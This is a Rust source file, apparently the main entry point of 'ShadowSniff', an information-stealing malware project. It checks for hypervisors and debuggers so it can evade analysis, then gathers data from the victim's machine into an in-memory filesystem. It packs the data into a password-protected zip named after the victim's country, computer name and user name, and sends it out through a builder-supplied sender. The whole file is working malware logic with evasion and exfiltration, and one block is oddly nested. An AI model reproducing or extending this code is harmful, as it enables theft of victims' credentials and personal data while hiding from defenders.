/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
use alloc::format;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::atomic::AtomicCollector;
use collector::display::PrimitiveDisplayCollector;
use collector::{Browser, Collector, Software, Vpn};
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::virtualfs::VirtualFileSystem;
use ipinfo::{IpInfo, init_ip_info, unwrapped_ip_info};
use rand_chacha::ChaCha20Rng;
use rand_core::RngCore;
use sender::LogSenderExt;
use shadowsniff::SniffTask;
use tasks::Task;
use utils::pc_info::PcInfo;
use utils::random::ChaCha20RngExt;
use zip::ZipArchive;

#[inline(always)]
pub fn run() {
    include!(env!("BUILDER_START_DELAY"));

    if !init_ip_info() {
        panic!()
    }

    // Optional hypervisor protection (advanced anti-debug / anti-VM)
    #[cfg(feature = "hypervisor_protection")]
    {
        use hypervisor::HypervisorProtection;
        let protection = HypervisorProtection::new();
        let status = protection.get_protection_status();
        // Simple reaction example – exit early if a hypervisor is detected at maximum obfuscation level.
        // Adjust policy as desired (you could also degrade functionality instead of exiting).
        if status.hypervisor_detected {
            // Prevent execution inside virtualized / analysis environments.
            return;
        }
    }

    // Optional code virtualization (executes a small anti-debug check inside the custom VM)
    #[cfg(feature = "code_virtualization")]
    {
    // Basic obfuscation feature hook (ensures crate is referenced when feature enabled)
    #[cfg(feature = "obfuscation")]
    {
        use obfuscation::ObfuscationLevel;
        // Select level based on compile-time cfg from build script if present
        #[allow(unused_variables)]
        let _obf_level = if cfg!(obfuscation_maximum) { ObfuscationLevel::Maximum } else if cfg!(obfuscation_heavy) { ObfuscationLevel::Heavy } else if cfg!(obfuscation_medium) { ObfuscationLevel::Medium } else { ObfuscationLevel::Light };
    }
        use code_vm::{CodeVM, CodeCompiler};
        use core::hash::{Hasher, Hash};
        // Derive a semi-stable key from BUILD_ENTROPY if present
        let mut key: u64 = 0xA5A5_5A5A_F0F0_0F0F;
        if let Ok(entropy) = std::env::var("BUILD_ENTROPY") {
            let mut hasher = core::hash::BuildHasherDefault::<core::hash::SipHasher13>::default().build_hasher();
            entropy.hash(&mut hasher);
            key ^= hasher.finish();
        }
        let compiler = CodeCompiler::new(key);
        let program = compiler.compile_function("anti_debug_check");
        let mut vm = CodeVM::new(key);
        vm.load_program(program);
        let _ = vm.execute(); // Ignore errors; VM-based anti-debug is best-effort.
    }

    #[cfg(feature = "message_box_before_execution")]
    include!(env!("BUILDER_MESSAGE_BOX_EXPR"));

    let fs = VirtualFileSystem::default();
    let out = &Path::new("\\output");
    let _ = fs.mkdir(out);

    let collector = AtomicCollector::default();

    SniffTask::default().run(out, &fs, &collector);

    let password: String = {
        let charset: Vec<char> = "shadowsniff0123456789".chars().collect();
        let mut rng = ChaCha20Rng::from_nano_time();

        (0..15)
            .map(|_| {
                let idx = (rng.next_u32() as usize) % charset.len();
                charset[idx]
            })
            .collect()
    };

    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));

    include!(env!("BUILDER_CONSIDER_EMPTY_EXPR"));

    let zip = ZipArchive::default()
        .add_folder_content(&fs, out)
        .password(password)
        .comment(displayed_collector);

    let sender = include!(env!("BUILDER_SENDER_EXPR"));

    let _ = sender.send_archive(generate_log_name(), zip, &collector);

    #[cfg(feature = "message_box_after_execution")]
    include!(env!("BUILDER_MESSAGE_BOX_EXPR"));
}

fn generate_log_name() -> Arc<str> {
    let PcInfo {
        computer_name,
        user_name,
        ..
    } = PcInfo::retrieve();

    let IpInfo { country, .. } = unwrapped_ip_info();

    format!("[{country}] {computer_name}-{user_name}.shadowsniff.zip").into()
}
